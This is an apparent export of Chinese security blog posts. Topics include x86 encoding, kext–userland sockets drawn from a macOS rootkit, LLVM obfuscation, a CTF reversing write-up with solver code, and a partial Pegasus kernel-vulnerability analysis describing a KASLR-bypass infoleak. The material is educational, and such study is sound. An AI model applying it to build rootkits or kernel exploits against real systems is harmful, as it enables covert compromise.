11指出寄存器寻址模式，mod = 00 ~ 10 时指出内存寻址模式： mod = 00，定义 [register] 间接寻址，无displacement值。 mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。 mod = 10，定义 [register + disp32]，有32位displacement偏移值。 2、reg：寄存器ID值 3位组成8个寄存器ID值，从 000 ~ 111，对应于 RAX、RCX、RDX、RBX、RSP、RBP、RSI以及RDI。这个ID值可以被REX prefix扩充为4位，范围从 0000 ~ 1111可表示16个寄存器。 reg域的另一含义是对Opcode的补充，对分为一组Opcode的进行选择（Group属性）。 3、r/m：意即register / memory。 ​ 提供对registers或memory的寻址，也用来表示寄存器ID，当是registers时是寄存器ID值。当是memory时是寄存器间接寻址中的寄存器ID值。当mod != 11 时，r/m 表示 [rax] ~ [rdi]，REX prefix用来扩充寄存器ID值。 注意: (1) 如果像这条指令：mov eax, [eax+ecx2+0x0c] 在这条指令里eax是base寄存器，ecx是Index寄存器，2是scale，还有一个displacement ,这种内存寻址是base+indexscale+disp。这需要SIB字节来进行确定，那么ModRM必须要有一个手段来引出后续的SIB字节。在 [rax] ~ [rdi] 的范围里，Intel选择了原来应属于 [rsp] 的值用来引出SIB，一是因为 [rsp] 并不常用吧。二是因为 rsp 设计为 stack top指针，专用于stack top指针。 原来属于 [rsp] 的领域对应的，r/m是100，这个领域被 [SIB] 替代了，事实上在16位机器原本是没有SIB字节的，base+index*scale+disp这种寻址是后来才增加的。16位的ModRM上是没有SIB引导域。 (2)如果内存寻址中没有base和index，只有disp的话，如：mov ebx, [0x11223344]，这种直接寻址方式，在设计上ModRM还必须为提供这个模式。 Intel又作出修改，选择了原来属于 [rbp] 模式的领域提供给 [disp]，选择 [rbp] 让给 [disp]，是因为 rbp 原本意图就是设计为 stack基址指针。[rbp] 寻址一般都要加上一个偏移量，也就是基于stack frame指针的偏移量，即 [ebp + disp] 这种寻址模式在 mod = 01 或 mod = 10 中给出。 SIBSIB意即：Scale – Index – Base，用来定义base+index*scale+disp这种寻址模式。同样按2-3-3比例组合。 7-6 5-4-3 2-1-0 scale index base index 域指出index寄存器的ID值，范围从 000 ~ 111。base 域指出base寄存器的ID 值，从 000 ~ 111。Index与base经过 REX prefix可以扩展为0000 ~ 1111。 Displacement 和 Immediate某些指令会在最后要求有一个用于计算内存地址的值，或者一个立即数。很明显，不多说。 综合起来，看下面的例子： 49 8b 7d 00 49=0100 1001对应REX prefix,默认64为size模式 8b= mov opcode 7d=01 111 101—&gt;ModR/M mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。rdi ,r13 00=Displacement = 0 所以指令= mov rdi,QWORD PTR [r13+0]—&gt;mov rdi,[r13] ​ 参考及索引http://ref.x86asm.net/coder32.html —-&gt; 查阅opcode http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png —&gt;quick look Intel x86 Assembler Instruction Set Opcode Table http://www.mouseos.com/x64/index.html https://bbs.pediy.com/thread-78121.htm X86指令编码的那些事儿 http://subler.github.io/note/compiler/x86_instruction_encode.html onlineDisassembler","tags":[{"name":"x86","slug":"x86","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/x86/"}]},{"title":"一种用户层与kext内核扩展交互方式","date":"2017-08-10T07:59:00.000Z","path":"2017/08/10/一种用户层与kext内核扩展交互方式/一种用户层与kext内核扩展交互方式/","text":"最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。简单说下rootKit原理：利用kext驻留在内核，完成实际的各种功能：sys_ptrace过滤 PT_DENY_ATTACH反调试hook系统调用防止sys_kil（很强大有木有）隐藏自身进程，文件监控，网络监控，提权等等可谓是相当可怕。这些功能都可以通过一个用户进程来控制，所以这里必须有一种机制来提供kext与用户层的交互方式，这就是本文重点。 0x01 一个例子进入kext开发在这之前，简单的用一个例子来学习下kext开发。下面关于xcode中的操作都很明显，故忽略。 打开xcode创建一个Generic Kernel Extension工程，完成之后会出现一个kext模板，如下 #include &lt;mach/mach_types.h&gt; #include &lt;libkern/libkern.h&gt; kern_return_t TestExtension_stop(kmod_info_t *ki, void *d); kern_return_t TestExtension_start(kmod_info_t * ki, void *d) { printf(&quot;hello kext!\\n&quot;); return KERN_SUCCESS; } kern_return_t TestExtension_stop(kmod_info_t *ki, void *d) { printf(&quot;bye kext!\\n&quot;); return KERN_SUCCESS; } 其中这两个函数分别在内核扩展加载和卸载时调用，比如上面我们只是打印一行hello kext，这句话就会在这个kext加载是打印出来（在系统日志中查看）你可能会有疑惑，系统如何知道是这两个函数的，这个是在工程中设置的，你可以改变成任何函数都是OK的。 简单编译一下，然后找到编译后的kext文件，输入命令改变权限 sudo chown -R root:wheel TestExtension.kext 再输入 sudo kextload TestExtension.kext 加载内核扩展，如果一切没错的话，这时你在系统日志中就会出现hello kext这句话。同理你可以输入下面的命令 sudo kextunload TestExtension.kext 来卸载该内核扩展，你同样会看到bye kext这句话。 0x02 用户层与内和扩展间的交互下面要介绍的是一种类似于socket机制的交互机制，通常kext在加载的时候会建立一个socket服务器，然后用户层程序去打开这个socket（使用PF_SYSTEM协议）。接下来kext就会处理来至用户端的命令。下面同样通过一个例子来表明他们之间的交互，这里分为kext和客户端两部分。 kext 示例代码#include &lt;sys/systm.h&gt; #include &lt;mach/mach_types.h&gt; #include &lt;mach/kern_return.h&gt; #include &lt;sys/kern_control.h&gt; //#include &lt;SOMEWHERE YOU CAN GET STRNCPY IN THE KERNEL FROM&gt; char name[] = &quot;com.example.mymodule&quot; ;//标识这个kext struct kern_ctl_ref _ctlref ; kern_return_t start(kmod_info_t *info, void *data) { int err ; struct kern_ctl_reg ctlreg ; bzero(&amp;ctlreg, sizeof(ctlreg)) ; //控制信息 ctlreg.ctl_id = 0 ; /* 请求分配一个动态id */ ctlreg.ctl_unit = 0 ; strncpy(ctlreg.ctl_name, name, sizeof(ctlreg.ctl_name)); //回调函数 ctlreg.ctl_connect_func = connect ; ctlreg.ctl_disconnect_func = disconnect ; ctlreg.ctl_send_func = send ; ctlreg.ctl_getopt_func = getopt ; ctlreg.ctl_setopt_func = setopt ; //注册内核控制 err = ctl_register(&amp;ctlreg, &amp;_ctlref) ; if (err) return KERN_FAILURE ; return KERN_SUCCESS ; } 下面解释下其中的kern_ctl_ref数据结构 struct kern_ctl_reg { /* 控制信息 */ char ctl_name[MAX_KCTL_NAME]; u_int32_t ctl_id; u_int32_t ctl_unit; /* 控制设置 */ u_int32_t ctl_flags; u_int32_t ctl_sendsize; u_int32_t ctl_recvsize; /* 回调函数 */ ctl_connect_func ctl_connect;//建立连接时调用 ctl_disconnect_func ctl_disconnect;//断开连接时调用 ctl_send_func ctl_send;//处理从client到kernel的数据发送 ctl_setopt_func ctl_setopt; //当client调用setsockopt时调用 ctl_getopt_func ctl_getopt;//当client调用getsockopt时调用 }; client 示例代码#include &lt;socket.h&gt; #include &lt;string.h&gt; #include &lt;sys/kern_control.h&gt; #include &lt;sys/ioctl.h&gt; char name[] = &quot;com.example.mymodule&quot; ;//标识这个kext static int g_socket = -1; u_int32_t getctlidbybame(int sock, char *name) ; //建立连接 int socket_ctl(char *name) { int g_sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL) ; if (g_sock == 0) return 0 ; u_int32_t id = getctlidbyname(g_sock, name) ; sockaddr_ctl addr ; addr.sc_len = sizeof(addr) ; addr.sc_family = AF_SYSTEM ; addr.sc_sysaddr = AF_SYS_CONTROL ; addr.sc_id = id ; addr.sc_unit = 0 ; /* allocate dynamically */ int err ; err = connect(g_sock, (struct sockaddr*)&amp;addr, sizeof(addr)) ; if (err) return 0 ; return sock ; } u_int32_t getctlidbybame(int sock, char *name) { struct ctl_info info ; memset(&amp;info, 0, sizeof(info)) ; strncpy(info.ctl_name, name, strlen(name)) ; int err = ioctl(sock, CTLIOCGINGO, &amp;info) ; if (err) return 0 ; /* should do something stronger here! */ return info.ctl_id ; } int main(int argc, const char *argv[]) { socket_ctl(name); } //发送数据 void execute_cmd(int cmd, char *args) { char data[32] = { 0 }; size_t data_len = 0; int retv; if(args != NULL) { memcpy(data, args, strlen(args)); } data_len = strlen(data) + 1; retv = setsockopt(g_socket, SYSPROTO_CONTROL, cmd, (void *)data, (socklen_t)data_len); if(retv != 0) { printf(&quot;[ERROR] Kernel command execution failed:\\n&quot;); printf(&quot;\\t%s (%d)\\n&quot;, strerror(errno), errno); return; } } //接收数据 void get_data() { char *data = malloc(32); socklen_t data_len = 32; int retv = getsockopt(g_socket, SYSPROTO_CONTROL, 0, data, &amp;data_len); if(retv != 0) { printf(&quot;[ERROR] getsockopt()\\n&quot;); return; } size_t r = recv(g_socket, data, data_len, 0); if(r == 0) { printf(&quot;[ERROR] recv()\\n&quot;); return; } } 代码不是很复杂，先通过kext名去获取一个id建立一个socket，然后通过这个socket去发送和接受kext的数据。 0x03 总结在这个rootKit框架中还有很多可以挖掘的东西，里面hook系统调用来达到反kill等功能很是实用，以及一些内核操作手段都值得学习和借鉴，待续… 0x04 参考 http://www.tanhao.me/pieces/1515.html/ https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html https://github.com/enzolovesbacon/inficere","tags":[{"name":"kext","slug":"kext","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"}]},{"title":"初-LLVM的代码混淆","date":"2017-06-25T07:09:13.000Z","path":"2017/06/25/初-LLVM的代码混淆/初-LLVM的代码混淆/","text":"0x00 目录 断断续续的学习了一段时间的LLVM，记录下学习进度，随着后面的学习待更新 LLVM简介 一个基于LLVM简单的代码混淆例子 参考链接 0x01 LLVM简介LLVM(low level virtual machine)是一个先进的编译器框架，它提供了一种代码编写良好的中间表示(IR)，可以作为多种语言的后端，还可以提供与变成语言无关的优化和针对多种cpu的代码生成功能。LLVM的主要架构如下： 前端：前端用来获取源代码然后将它转变为某种中间表示，我们可以选择不同的编译器来作为LLVM的前端，如gcc，clang。 Pass：Pass是LLVM优化工作的一个节点，一个节点做些事，一起加起来就构成了LLVM完整的优化和转化。 后端：后端用来生成实际的机器码，一般情况下不会关注这一部分。 LLVM框架：这里与传统的编译器不同，LLVM采用了一种统一的中间表示： 安装与使用首先下载LLVM $ cd where-you-want-llvm-to-live $ svn co http://llvm.org/svn/llvm-project/llvm/trunk llvm 我们选择clang作为LLVM前端，然后下载clang $ cd where-you-want-llvm-to-live $ cd llvm/tools $ svn co http://llvm.org/svn/llvm-project/cfe/trunk clang 下载编译运行库 $ cd where-you-want-llvm-to-live $ cd llvm/projects $ svn co http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt 最后编译LLVM源码 $ mkdir build $ cd build $ cmake -DCMAKE_BUILD_TYPE:String=Release ../llvm/ $ make 编译时间可能有点长，编译完成之后进行安装 $sudo make install 接下来就是LLVM的使用，先创建一个hello.c源文件 #include &lt;stdio.h&gt; int main(){ printf(&quot;hello LLVM\\n&quot;); return 0; } 0x02 一个基于LLVM简单的代码混淆例子Pass是LLVM中一个很重要的部分，每个Pass都是做优化或者转换的工作，LLVM的优化和转换工作就是由很多个Pass一起完成的。我们通过继承指定的类以及实现相关的虚函数来实现具体的Pass，具体的类型主要有以下几种： ImmutablePass MoudlePass CallGraphSCCPass FuncationPass LoopPass RegionPass BasicBlockPass MachineFunctionPass 下面这个例子来介绍一下pass的编写并达到简单的混淆。从这里下载这个模板llvm-pass-skeleton 下面是完整代码： #include &quot;llvm/Pass.h&quot; #include &quot;llvm/IR/Function.h&quot; #include &quot;llvm/Support/raw_ostream.h&quot; #include &quot;llvm/IR/LegacyPassManager.h&quot; #include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot; #include &quot;llvm/IR/Intrinsics.h&quot; #include &quot;llvm/IR/Instructions.h&quot; using namespace llvm; namespace { struct SkeletonPass : public FunctionPass { static char ID; SkeletonPass() : FunctionPass(ID) {} // virtual bool runOnFunction(Function &amp;F) { // errs() &lt;&lt; &quot;I saw a function called &quot; &lt;&lt; F.getName() &lt;&lt; &quot;!\\n&quot;; // return false; // } bool runOnFunction(Function &amp;F) override { Function *tmp = &amp;F; // 遍历函数中的所有基本块 for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) { // 遍历基本块中的每条指令 for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) { // 是否是add指令 if (inst-&gt;isBinaryOp()) { if (inst-&gt;getOpcode() == Instruction::Add) { ob_add(cast&lt;BinaryOperator&gt;(inst)); } } } } return false; } // a+b === a-(-b) bool ob_add(BinaryOperator *bo) { BinaryOperator *op = NULL; if (bo-&gt;getOpcode() == Instruction::Add) { // 生成 (－b) op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo); // 生成 a-(-b) op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, &quot;&quot;, bo); op-&gt;setHasNoSignedWrap(bo-&gt;hasNoSignedWrap()); op-&gt;setHasNoUnsignedWrap(bo-&gt;hasNoUnsignedWrap()); } // 替换所有出现该指令的地方 bo-&gt;replaceAllUsesWith(op); } }; } char SkeletonPass::ID = 0; // Automatically enable the pass. // http://adriansampson.net/blog/clangpass.html static void registerSkeletonPass(const PassManagerBuilder &amp;, legacy::PassManagerBase &amp;PM) { PM.add(new SkeletonPass()); } static RegisterStandardPasses RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible, registerSkeletonPass); 通过继承FunctionPass重写虚函数runOnFunction来到达我们代码混淆的目的，再看关键的混淆部分，如下面注释那样，找到函数中的add指令，并将其改为sub指令。如a+b经过混淆为a-(-b) bool runOnFunction(Function &amp;F) override { Function *tmp = &amp;F; // 遍历函数中的所有基本块 for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) { // 遍历基本块中的每条指令 for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) { // 是否是add指令 if (inst-&gt;isBinaryOp()) { if (inst-&gt;getOpcode() == Instruction::Add) { ob_add(cast&lt;BinaryOperator&gt;(inst)); } } } } return false; } 代码很简单，这里就不多说。我们使用 $clang -Xclang -load -Xclang build/skeleton/libSkeletonPass.* something.c 来运行这个pass编译成目标可执行文件现在我们创建一个addTest.c文件来测试是否代码混淆 #include &lt;stdio.h&gt; int func(int a,int b) { return a + b; } int main() { int c; c = func(6,9); printf(&quot;%d\\n&quot;,c); return c; } 先按照一般的编译源代码，查看关键汇编代码：然后运行我们的pass进行编译很明显，汇编代码发生了改变，当然这里仅仅是一个简单的混淆，感兴趣的可以研究下obfuscator-llvm这个项目。 0x03 参考链接深入剖析 iOS 编译 Clang / LLVMhttp://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/","tags":[{"name":"LLVM","slug":"LLVM","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLVM/"},{"name":"obfuscation","slug":"obfuscation","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/obfuscation/"}]},{"title":"pwnhub-CTF re150","date":"2017-05-28T01:16:13.000Z","path":"2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/","text":"0x00 写在前面第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度的，这里记录下其中的一道逆向题。题目在这里 0x01 简单分析拿到题目后试着在虚拟机里运行了一下，看下有什么提示 然后转去hopper搜下相关字符串，并没有发现error相关字符串，syclover也没有相关printf等函数输出，看来只能上gdb调试看看。 发现程序里面有多处花指令以及隐藏了程序入口。 由上图可以发现syclover直接由int 0x80系统调用中断输出到屏幕，下面是一个循环解密，后面可知解密的正是程序的入口。 由__libc_start_main函数可得第一个参数即为main函数地址这里作为对比，可以看下hopper中对0x8048320main函数的解析完全不知道是什么有木有？所以拿到题如果放到IDA之类的反汇编工具根本看不出什么线索 接下来所做的事就是获取输入的字符串然后进行加密，然后与程序里的字符串加密比较，具体看后面的代码。 0x02 修复程序根据上面的分析，我们将程序进行修复 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;assert.h&gt; #include &lt;elf.h&gt; #define ENTRY 0x08048320 #define FILE_OFF 0x320 #define COUNT 0x432 int main(int argc,char *argv[]){ Elf32_Ehdr ehdr; unsigned char buf[COUNT] = {0}; assert(argc == 2); int fd = open(argv[1],O_RDWR);//打开文件 assert(fd&gt;0); assert(lseek(fd,0,SEEK_SET)!=-1);// 读取elf头 assert(read(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr)); ehdr.e_entry = ENTRY;//修改入口地址 assert(lseek(fd,0,SEEK_SET)!=-1);//回写elf头 assert(write(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr)); //解密 assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//读取被加密的代码 assert(read(fd,buf,COUNT) == COUNT); int i = 0; while(i&lt;COUNT){ buf[i] = (buf[i]^66)&lt;&lt;5 | (buf[i]^66)&gt;&gt;3; i++; } assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//写入正确代码 assert(write(fd,buf,COUNT) == COUNT); 0x03 分析算法计算flag#!/usr/bin/python # -*- coding: UTF-8 -*- from __future__ import print_function import sys def getflag(): print(&quot;[i]start to encrypt key&quot;) key = [0x73,0x8d,0xf2,0x4c,0xc7,0xd4,0x7b,0xf7,0x18,0x32,0x71,0x0d,0xcf,0xdc,0x67,0x4f,0x7f,0x0b,0x6d] encryptKey = [] print(&quot;encryptKey=[&quot;, end=&quot;&quot;) for idx in range(len(key)): encryptKey.append(key[idx] ^ 0x20) print(&quot;%x &quot; % encryptKey[idx], end=&quot;&quot;) print(&quot;]&quot;) flag = [] print(&quot;[i]find the flag&quot;) for i in range(len(encryptKey)): count = 0x00 while(count &lt;= 0x7f): one = count &gt;&gt; (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d)) two = count &lt;&lt; (0x8 - (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d))) if((((one | two) ^ i) &amp; 0xff) == encryptKey[i]): flag.append(count) break count = count + 1 print(&quot;flag = &quot;,end=&quot;&quot;) for i in range(len(flag)): print(&quot;%c&quot; % flag[i], end=&quot;&quot;) if __name__ == &#39;__main__&#39;: key = getflag() 最后运行程序得到flag [i]start to encrypt key encryptKey=[53 ad d2 6c e7 f4 5b d7 38 12 51 2d ef fc 47 6f 5f 2b 4d ] [i]find the flag flag = SYC{&gt;&gt;Wh06m1&gt;&gt;R0Ot} 测试：","tags":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CTF/"},{"name":"writeup","slug":"writeup","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/writeup/"}]},{"title":"一道高中数学题的思考？","date":"2017-05-04T12:37:59.000Z","path":"2017/05/04/math/math/","text":"0x00 写在前面 突然在邮件中收到Quora中这样一个问题”What does X equal in $\\sqrt{x+15} + \\sqrt{x} = 15$? “ 凭着曾经对数学的热爱，我点了进去。顺便学习了点知识。 0x01 你会怎么解决？不得不承认，这种题型在初高中时候还是蛮常见的，在我的脑海里，也别无他法，一步一步去根号解方程吧。但都知道，同时平方带来就是可能会升高次数，有时候拿到答案还是挺繁琐的，至少计算上来说是这样的。 0x02 方法1 平方法通常解决这个问题的方法是将方程的两边平方并简化，并保持平方，直到方程中没有平方根 $\\sqrt{x+15} + \\sqrt{x} = 15$ $(\\sqrt{x+15} + \\sqrt{x})^2 = 15^2$ $x+15 + 2\\sqrt{(x+15)x} + x = 225$ $2\\sqrt{(x+15)x} = 210 - 2x$ $\\sqrt{(x+15)x} = 105 - x$ $(\\sqrt{(x+15)x})^2 = (105 - x)^2$ $x^2 + 15x = 11025 - 210x +x^2$ $225x = 11025$ $ x = 49$思维过程很清楚，但明显计算上有点繁琐。 0x03 方法2 拼凑法不一定可靠，但一定最快。大多情况下，都是开方后是整数。所以每个完全平方数的序列（$1^22^23^3…6^27^28^2… =&gt; 1 4 9 16 25 36 49 64 …$） 哪两个数相差15呢？很明显64 - 49 = 15，也许你觉得这很不靠谱，其实至少对于开方是整数的结果来说是很快的，觉得慢主要是你还不熟练。因为并不是一个一个的去试验，因为相邻之差是递增且快。类似二叉树来查找会很快得出结果。 $\\sqrt{49 + 15} + \\sqrt{49} = 15$ $7 + 8 = 15$最快，但不一定可靠。 0x04 方法3 平方差法暂且称作平方差法吧，这个方法是我最推荐的，既快又准。原式：$\\sqrt{x+15} + \\sqrt{x} = 15$ (1) 设 $\\sqrt{x+15} - \\sqrt{x} = k$ 又 $(\\sqrt{x+15} - \\sqrt{x})(\\sqrt{x+15} + \\sqrt{x})= 15k$ 解得： $k = 1$ 所以 $\\sqrt{x+15} - \\sqrt{x} = 1$ （2） 然后（1）+ (2): $2\\sqrt{x+15} = 16$ 解得: $x = 49$ 多么棒的一个方法 I love it！ 0x05 我与数学从小数学就比语文好的我，数学确实给了我很多自信，想破头皮的去思考一个一个的题。一如既往的热爱，以致于高考只填了一个专业–数学。由于种种原因，没能选上，去来到了计算机相关的专业。计算机科学同样是一个迷人的世界，那种理解本质，控制计算机的运行是让人着迷的。在反馈上来说，计算机比做数学得到的反馈更真实，快速。做数学题的时候总是找不到方向，得到的反馈少且慢，容易让人沮丧，想必这也是大多人讨厌数学的原因之一吧。虽然现在更热爱计算机，但心底里仍然有一个数学的种子。以至于很多时候看到感兴趣的题也会拿上纸笔算一算，知乎上也关注了相关话题，还有一个自己特别骄傲的回答，关于高中数列的，具体情况移步高考数学数列放缩总结技巧有哪些？相信不管是现在还是将来，数学都是我最深处的支持。","tags":[{"name":"math","slug":"math","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/math/"}]},{"title":"Pegasus内核漏洞及PoC分析","date":"2017-05-01T06:52:45.000Z","path":"2017/05/01/Pegasus内核漏洞及PoC分析/Pegasus内核漏洞及PoC分析/","text":"0x00 写在前面 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google 1.iOS“远程越狱”间谍软件Pegasus技术分析 2.iOS三叉戟漏洞补丁分析、利用代码 公布（POC 3.Pegasus – 针对iOS设备的APT攻击分析 0x01 目录 OSUnserializeBinary概述 漏洞分析-CVE-2016-4655，CVE-2016-4656 漏洞利用-PoC分析 总结 0x02 OSUnserializeBinary概述 序列化与反序列化在软件开发的过程中，两个模块通信时就需要序列化与发序列化，常见的xml-&gt;JSON，对应的反序列化JOSN-&gt;xml。简单来说就是数据格式上的一种相互转化。在XNU内核也有一个实现，OSUnserializeXML(将xml格式转化为内核数据对象)和OSUnserializeBinary(将二进制格式转化为内核数据对象) OSUnserializeBinary的二进制格式OSUnserializeBinary这个函数将连续的二进制流分成uint32_t32字节来处理。所以32位的整数就有特殊含义来表示一些数据结构。如下 #define kOSSerializeBinarySignature &quot;\\323\\0\\0&quot; /* 0x000000d3 */ enum { kOSSerializeDictionary = 0x01000000U, kOSSerializeArray = 0x02000000U, kOSSerializeSet = 0x03000000U, kOSSerializeNumber = 0x04000000U, kOSSerializeSymbol = 0x08000000U, kOSSerializeString = 0x09000000U, kOSSerializeData = 0x0a000000U, kOSSerializeBoolean = 0x0b000000U, kOSSerializeObject = 0x0c000000U, kOSSerializeTypeMask = 0x7F000000U, kOSSerializeDataMask = 0x00FFFFFFU, kOSSerializeEndCollection = 0x80000000U, }; 这里的0x000000d3代表了这个数据流的签名即开始的32位必须为该整数值，下面有一个字典，数组，集合等集合类数据结构，也有数字，字符串等基本数据结构表示。kOSSerializeTypeMask和kOSSerializeDataMask分别为类型和数据大小掩码。kOSSerializeEndCollection代表当前集合(dic，array或set)是否结束。可以看到，31位表示当前集合是否结束，30-24位表示当前数据类型，23-0表示元素的长度。 当前集合是否结束 当前数据类型 当前元素长度 0 0000000 000000000000000000000000 例如下面的二进制数据 0x000000d3 0x81000000 0x09000004 0x41414141 0x8b000001 则对应： &lt;dict&gt; &lt;string&gt;AAAA&lt;/string&gt; //键key &lt;boolean&gt;1&lt;/boolean&gt; //值value &lt;/dict&gt; 这样的数据结构。对应过程也很简单，0x000000d3标志为合法的签名，0x81000000为dic类型且为最后一个元素，0x09000004为4字节大小的字符串，0x8b000001为bool型，所以只需用最后一位代表true或false OSUnserializeBinary()分析完整源代码见文末，下面将对其中几个重要的地方分别做分析说明 while (ok) { bufferPos += sizeof(*next); if (!(ok = (bufferPos &lt;= bufferSize))) break; key = *next++; len = (key &amp; kOSSerializeDataMask); wordLen = (len + 3) &gt;&gt; 2; end = (0 != (kOSSerializeEndCollecton &amp; key)); newCollect = isRef = false; o = 0; newDict = 0; newArray = 0; newSet = 0; switch (kOSSerializeTypeMask &amp; key) { case kOSSerializeDictionary: ... case kOSSerializeArray: ... case kOSSerializeSet: ... case kOSSerializeObject: ... case kOSSerializeNumber: ... case kOSSerializeSymbol: ... case kOSSerializeString: ... case kOSSerializeData: ... case kOSSerializeBoolean: ... default: break; } ... 进行一些初始化和检查后就进入while(ok)循环，并且是以32位的整数位单位遍历循环，读取当前的整数key，确定其长度len，当前集合31位是否设置end。并通过类型掩码kOSSerializeTypeMask确定其key的类型从而进入不同的case。例如我们看kOSSerializeDictionary例子 case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len != 0); break; o为指向当前反序列化对象的指针，在每种case中被指定 case kOSSerializeData: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSData::withBytes(next, len); next += wordLen; break; 这里当遇到一个为kOSSerializeData类型时，根据其len找到其数据并将其存储在OSData数据结构中，并移动next。其他的case都做类似对应的处理。跳出switch if (!(ok = (o != 0))) break; 因为每一次循环都会进入case并将o设置为对应对象才合法，当等于0时就说明不合法，则退出。 if (!isRef) { setAtIndex(objs, objsIdx, o); if (!ok) break; objsIdx++; } 这里很重要将与后面的漏洞相关，首先判断isRef是否被设置。 case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; isRef只有当当前的类型为kOSSerializeObject即引用类型是才被设为true，这里引用的意思则表示当前指向dic中其他数据，其值为对应下标。回到前面那里，下面重点关注setAtIndex这个宏定义 #define setAtIndex(v, idx, o) \\ if (idx &gt;= v##Capacity) \\ { \\ uint32_t ncap = v##Capacity + 64; \\ typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o)); \\ if (!nbuf) ok = false; \\ if (v##Array) \\ { \\ bcopy(v##Array, nbuf, v##Capacity * sizeof(o)); \\ kfree(v##Array, v##Capacity * sizeof(o)); \\ } \\ v##Array = nbuf; \\ v##Capacity = ncap; \\ } \\ if (ok) v##Array[idx] = o; 看着很复杂，但简单来说就是如果数组大小不够的话就增加大小，然后就将其之前的o指向的对象放到objs数组中对应的位置。 if (dict) { if (sym) { if (o != dict) ok = dict-&gt;setObject(sym, o, true); o-&gt;release(); sym-&gt;release(); sym = 0; } else { sym = OSDynamicCast(OSSymbol, o); if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o))) { sym = (OSSymbol *) OSSymbol::withString(str); o-&gt;release(); o = 0; } ok = (sym != 0); } } else if (array) { ok = array-&gt;setObject(o); o-&gt;release(); } else if (set) { ok = set-&gt;setObject(o); o-&gt;release(); } else { assert(!parent); result = o; } 对解析出来的当前的集合做对应处理，比如这里的如果dic为真，因为dic字典数据结构需要key-&gt;value键值对的形式，所以先判断sym，若没设置，则代表当前o对象为key，则将其转化为OSSymbol类型，设置sym为true并将ofree，那么下一次的o代表的对象一定是值，然后就将sym和o以键值对的形式存储在dic字典中，如此交替。后面的代码对漏洞来说不是很重要了 if (newCollect) { if (!end) { stackIdx++; setAtIndex(stack, stackIdx, parent); if (!ok) break; } DEBG(&quot;++stack[%d] %p\\n&quot;, stackIdx, parent); parent = o; dict = newDict; array = newArray; set = newSet; end = false; } if (end) { if (!stackIdx) break; parent = stackArray[stackIdx]; DEBG(&quot;--stack[%d] %p\\n&quot;, stackIdx, parent); stackIdx--; set = 0; dict = 0; array = 0; if (!(dict = OSDynamicCast(OSDictionary, parent))) { if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent))); } } 简单来说就是判断是否有新集合，如有的话，就将其压入栈中，那么后面的元素都放到新集合中，当end时就将整个新集合放入之前的dic。 0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656这里将介绍两个漏洞：1，CVE-2016-4655-infoleak漏洞；2，CVE-2016-4656-UAF漏洞 CVE-2016-4655-infoleak和我们之前分析的linux中printf格式漏洞类似，利用这个漏洞我们可以获取到内核栈中的地址信息，这些信息对于绕过KASLR内核地址空间随机偏移非常有用，因为系统每次启动时内核地址都偏移了一随机数，一旦确定了KSALR，我们就可以进一步做ROP等攻击。 下面看漏洞点，回顾之前kOSSerializeNumber这个case内容 case kOSSerializeNumber: bufferPos += sizeof(long long); if (bufferPos &gt; bufferSize) break; value = next[1]; value &lt;&lt;= 32; value |= next[0]; o = OSNumber::withNumber(value, len); next += 2; break; 这里存在什么问题呢？这里没有检查OSNumber的长度，也就是说我们可以创建一个任意长度的OSNumber，进而在内核读取的时候越界，然后泄漏内核地址信息。 